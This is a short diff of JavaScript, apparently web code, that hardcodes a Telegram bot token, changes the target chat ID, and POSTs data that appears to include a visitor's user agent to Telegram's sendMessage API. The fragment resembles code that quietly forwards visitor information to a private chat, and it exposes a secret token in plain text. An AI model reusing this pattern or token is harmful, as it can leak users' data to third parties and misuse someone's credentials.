@@ -29,7 +29,7 @@ ${data.ua}
 
         // 👇 ВСТАВЬ СВОИ ДАННЫЕ
         const botToken = "8204163101:AAHaBZZd18u9-HqtlY5h4P2NQUC4VpOsHPM";
-        const chatId = "8204163101";
+        const chatId = "6411412302";
 
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
